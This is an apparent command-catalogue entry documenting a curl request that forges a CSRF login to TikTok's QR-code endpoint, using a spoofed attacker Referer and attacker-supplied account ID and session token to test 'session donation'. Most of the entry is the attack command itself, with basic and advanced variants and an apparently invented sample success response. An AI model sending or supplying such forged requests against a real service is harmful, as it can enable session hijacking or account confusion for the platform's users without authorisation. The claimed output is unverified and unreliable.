---
id: uuid-placeholder-9876-5432
data: >-
  curl -X POST 'https://www.tiktok.com/login/qr' -H 'Content-Type:
  application/x-www-form-urlencoded' -H 'Referer: https://attacker-site.com' -d
  'account_id=attacker_account_id&session_token=attacker_token'
tags:
  - csrf
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:49.701Z'
verified: false
validated: true
submitted: true
---
# curl-forged-login

## Command

```bash
curl -X POST 'https://www.tiktok.com/login/qr' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://attacker-site.com' \
  -d 'account_id=attacker_account_id&session_token=attacker_token'
```

## Description

This command simulates a forged CSRF request to TikTok's QR code login endpoint to test for session donation vulnerabilities. It sends a POST request with attacker-controlled parameters from an external referer, bypassing potential CSRF protections.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://www.tiktok.com/login/qr'` | Target endpoint URL | Yes |
| `-H 'Content-Type: ...'` | Sets the content type for form data | Yes |
| `-H 'Referer: ...'` | Fakes the referer to simulate cross-site request | Yes |
| `-d 'account_id=...'` | Payload with attacker account details | Yes |
| `session_token` | Attacker's session token for donation | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.tiktok.com/login/qr' -H 'Content-Type: application/x-www-form-urlencoded' -d 'account_id=12345'
```

### Advanced Usage

```bash
curl -X POST 'https://www.tiktok.com/login/qr' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Referer: https://evil.com' \
  -H 'User-Agent: TikTokApp/1.0' \
  -d 'account_id=12345&session_token=abc123&force_login=true'
```

## Expected Output

Successful execution returns an HTTP 200 response or a redirect JSON indicating login initiation, such as {"status": "success", "session_id": "donated_session"}. Failure due to CSRF would return 403 or token error.

## Related

- [[Related Procedure: Exploit-TikTok-QR-Code-Login-CSRF]]
